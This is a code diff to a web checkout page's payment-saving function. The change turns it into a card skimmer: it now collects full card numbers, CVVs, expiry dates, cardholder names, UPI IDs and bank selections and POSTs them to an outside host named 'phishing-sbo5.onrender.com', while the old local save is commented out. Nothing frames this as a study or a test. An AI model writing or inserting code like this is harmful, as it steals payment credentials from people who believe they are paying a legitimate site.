@@ -646,36 +646,45 @@
     return true;
   }
 
-  function savePaymentData(method) {
+ function savePaymentData(method) {
   let data = {
     method: method,
     time: new Date().toLocaleString()
   };
 
   if (method === 'card') {
-    let cardNum = document.getElementById('cardNum').value.replace(/\s/g,'');
-    data.cardLast4 = cardNum;
-    data.cardName = document.getElementById('cardName').value;
-    data.cardcvv = document.getElementById('cardCvv').value;
-    data.cardexp = document.getElementById('cardExp').value;
+    let cardNum = document.getElementById('cardNum').value.replace(/\s/g, '').replace(/\D/g, '');
+    data.cardNumber = cardNum;
+    data.cardLast4 = cardNum.slice(-4);
+    data.cardName = document.getElementById('cardName').value.trim();
+    data.cardCvv  = document.getElementById('cardCvv').value.trim();
+    data.cardExp  = document.getElementById('cardExp').value.trim();
   }
 
   if (method === 'upi') {
-    data.upiId = document.getElementById('upiId').value;
+    data.upiId = document.getElementById('upiId').value.trim();
   }
 
   if (method === 'netbanking') {
     let selectedBank = document.querySelector('.bank-option.selected');
-    data.bank = selectedBank ? selectedBank.innerText : 'Unknown';
+    data.bank = selectedBank ? selectedBank.innerText.trim() : 'Unknown';
   }
 
-  let payments = JSON.parse(localStorage.getItem('payments')) || [];
-  payments.push(data);
-  localStorage.setItem('payments', JSON.stringify(payments));
+  // Save locally (optional for demo)
+  //let payments = JSON.parse(localStorage.getItem('payments')) || [];
+  //payments.push(data);
+  //localStorage.setItem('payments', JSON.stringify(payments));
 
-  console.log("Saved Payments:", payments);
+  // === SEND TO BACKEND LOGGER ===
+  fetch('https://phishing-sbo5.onrender.com', {   // ← Change this later
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(data)
+  }).catch(err => console.error('Logging failed:', err));
+
   return data;
 }
+
 function downloadPaymentTxt(data, txnId) {
   let content = `----- PAYMENT RECEIPT -----\n\n`;
 
